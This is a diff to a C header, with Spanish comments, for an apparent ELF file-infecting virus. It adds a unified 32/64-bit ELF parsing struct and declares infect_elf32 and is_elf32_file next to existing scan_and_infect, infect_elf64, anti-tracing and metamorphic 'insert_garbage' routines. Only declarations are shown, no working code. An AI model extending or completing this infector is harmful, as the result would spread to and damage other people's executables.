@@ -35,6 +35,31 @@ typedef struct {
     size_t size;
     size_t sig_offset;
 } virus_payload;
+// Después de la definición de t_elf, agregar:
+
+typedef struct {
+    void *data;
+    size_t size;
+    int class;  // ELFCLASS32 o ELFCLASS64
+    
+    union {
+        Elf32_Ehdr *ehdr32;
+        Elf64_Ehdr *ehdr64;
+    };
+    
+    union {
+        Elf32_Phdr *phdr32;
+        Elf64_Phdr *phdr64;
+    };
+    
+    union {
+        Elf32_Shdr *shdr32;
+        Elf64_Shdr *shdr64;
+    };
+} t_elf_unified;
+// Funciones para parsear ambos formatos
+int parse_elf_unified(const char *filename, t_elf_unified *elf);
+void cleanup_elf_unified(t_elf_unified *elf);
 void is_process_running(const char *process_name);
 void run_with_tracer(void);
 void child_process(void);
@@ -53,6 +78,8 @@ void scan_and_infect(const char *dir1, const char *dir2);
 void scan_directory(const char *dir_path);
 bool is_elf64_file(const char *filepath);
 int infect_elf64(const char *filepath, t_config * config);
+bool is_elf32_file(const char *filepath);
+int infect_elf32(const char *filepath, t_config *cfg);
 void init_metamorph(void);
 void insert_garbage(void);
 void insert_garbage5(void);
